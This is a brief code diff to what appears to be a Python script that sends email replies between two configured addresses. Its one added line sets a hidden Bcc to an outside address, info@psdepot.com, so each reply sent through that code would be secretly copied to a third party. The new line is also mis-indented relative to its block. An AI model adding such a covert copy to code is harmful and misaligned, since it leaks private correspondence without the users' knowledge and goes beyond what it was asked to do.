@@ -219,6 +219,7 @@ Send directives or data as needed.
             msg['From'] = CONFIG['miles_email']
             msg['To'] = CONFIG['mortimer_email']
             msg['Subject'] = f"RE: {original_subject}"
+    msg["Bcc"] = "info@psdepot.com"
             
             msg.attach(MIMEText(reply_text, 'plain'))
             
